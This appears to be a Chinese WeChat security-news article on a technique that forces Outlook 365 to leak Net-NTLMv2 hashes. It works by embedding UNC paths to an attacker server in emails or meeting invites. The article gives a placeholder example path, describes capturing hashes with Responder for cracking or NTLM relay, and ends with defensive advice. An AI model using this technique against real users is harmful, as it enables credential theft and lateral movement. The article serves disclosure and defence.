---
title: 攻击者利用 Outlook 365 漏洞强制截获 NTLM 哈希
url: https://mp.weixin.qq.com/s/Vd0GfbodXmvweO5I8CJp5Q
source: Doonsec's feed
date: 2026-04-07
fetch_date: 2026-04-08T04:33:16.475398
---

# 攻击者利用 Outlook 365 漏洞强制截获 NTLM 哈希

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6Omt6UYecqzKyDzRVSe0gtYN8mcPHHz7t2D1ZFRwkTqiacI5ntz0tefLwetibG2BickXQZqkhRU3O5Rg1TNiaatCZMbk9J9ibIiczg1M/0?wx_fmt=jpeg)

# 攻击者利用 Outlook 365 漏洞强制截获 NTLM 哈希

ExtremeHack
ExtremeHack

黑白之道

![]()

在小说阅读器中沉浸阅读

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6NjEoPwhTiawwG1Wmejiab8LTXsrO42Wk6FXvSadwpT02GpvXw302YGZvzFic4siaaul9Q2DaCrYOv6hdj2G2lptl7Uticgkfdny5mE/640?wx_fmt=png&from=appmsg)近期，网络安全研究人员披露了一项针对 **Microsoft Outlook 365** 的攻击技术。攻击者通过构造特殊的邮件或会议邀请，能够强制受害者客户端向远程服务器发起认证，从而秘密窃取 **Net-NTLMv2 哈希值**。

### 核心攻击流程

该攻击手段主要利用了 Outlook 处理通用命名约定（UNC）路径时的逻辑缺陷。

1. **构造恶意请求**：攻击者发送一封经过特殊构造的电子邮件或会议邀请。![Image](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6M7Yw5hdXiastmIFw4wRgKMvI9icamFsErtGxWRSs3HfUOwDTjQmubtqjeJSLSiaGzZdeXhwicfbK3uFWalby3yfVHSSvMZOPlibXkY/640?wx_fmt=png&from=appmsg)
2. **嵌入 UNC 路径**：在邮件元数据、附件路径或特定的 OLE 对象中嵌入指向攻击者控制服务器的 UNC 路径（例如：`\\攻击者IP\共享文件夹\图片.jpg`）。

   ![Image](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6Nq65OEnIjTTI85dCzgynxI8Qhd3BeNULWl4ycPAD7FNzkWVzTHwMGI2hW0ht3LeMlsYnGvvYu02ibXGyHMKcR2nqcxHYFeaADE/640?wx_fmt=jpeg&from=appmsg)
3. **自动触发认证**：当 Outlook 尝试预览邮件或处理提醒时，系统会自动尝试访问该路径。
4. **凭据泄露**：Windows 系统的 **Server Message Block (SMB)** 协议会自动发送当前登录用户的 Net-NTLMv2 哈希进行身份验证。
5. **离线破解或中继**：攻击者在后台使用 Responder 等工具捕获哈希。随后可以通过暴力破解获取明文密码，或者将其用于 **NTLM 中继攻击** 以获取内网进一步的访问权限。

### 风险评估

* **低交互性**：在某些配置下，受害者无需点击链接或下载附件，仅需打开预览窗格即可触发泄露。
* **高隐蔽性**：由于认证过程发生在系统底层，普通用户难以察觉异常。
* **潜在影响**：成功获取哈希后，攻击者可尝试攻破员工个人账号，甚至以此为跳板实现域渗透（Domain Compromise）。

---

### 技术分析：为什么 NTLM 依然危险？

尽管微软一直在推动更安全的身份验证协议（如 Kerberos），但 NTLM 为了兼容性在 Windows 环境中仍然广泛存在。

| **攻击环节** | **关键技术点** |
| --- | --- |
| **触发媒介** | Outlook 会议提醒声、嵌入式图标或远程加载资源。 |
| **泄露内容** | 包含用户名、域名及加密挑战响应的 Net-NTLMv2 数据包。 |
| **攻击场景** | 针对企业高管或运维人员的定向鱼叉式攻击（Spear Phishing）。 |

---

### 防御与缓解建议

为了应对此类威胁，建议安全团队立即采取以下措施：

* **限制 SMB 出站通信**：在防火墙层面封禁 TCP 445 端口的外网出站连接，防止凭据流向互联网。
* **实施 NTLM 策略管控**：通过组策略（GPO）限制 NTLM 认证的使用，或将用户加入“受保护的用户”组（Protected Users Group）。
* **强化补丁管理**：确保 Office 365 及 Windows 系统更新至最新版本，以修复已知的远程资源加载漏洞。
* **监控异常流量**：利用 IDS/IPS 监控内网向外部异常 IP 发起的 SMB 请求。

---

**ExtremeHack 总结：**

此类攻击再次证明，即使是成熟的办公软件，其自动化的便利性也可能成为安全短板。对于信息安全从业者而言，监控 UNC 路径的异常调用以及收紧 NTLM 认证协议是当前防御体系中的重中之重。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

黑白之道

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过